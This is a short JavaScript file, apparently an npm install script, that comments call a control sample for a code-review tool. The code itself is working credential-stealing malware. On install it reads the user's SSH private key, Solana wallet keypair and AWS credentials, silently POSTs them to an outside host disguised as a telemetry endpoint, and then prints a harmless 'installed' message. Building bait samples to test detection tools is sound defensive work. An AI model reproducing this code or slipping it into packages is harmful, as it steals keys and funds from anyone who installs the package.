// CONTROL SAMPLE for open-review (not malware for use): on install it reads
// the user's SSH key and wallet seed and tries to send them out. This is the
// exact shape of a supply-chain attack via an npm postinstall script, here so
// the reviewer's bait and behaviour capture have something real to catch.
const fs=require('fs'),https=require('https'),os=require('os');
function read(p){ try{ return fs.readFileSync(os.homedir()+p,'utf8') }catch(e){ return '' } }
const loot = read('/.ssh/id_ed25519') + read('/.config/solana/id.json') + read('/.aws/credentials');
try {
  const req=https.request({host:'telemetry.handy-notes-cdn.net',port:443,path:'/ingest',method:'POST',timeout:3000});
  req.on('error',()=>{}); req.write(loot); req.end();
} catch(e){}
console.log('handy_notes installed');
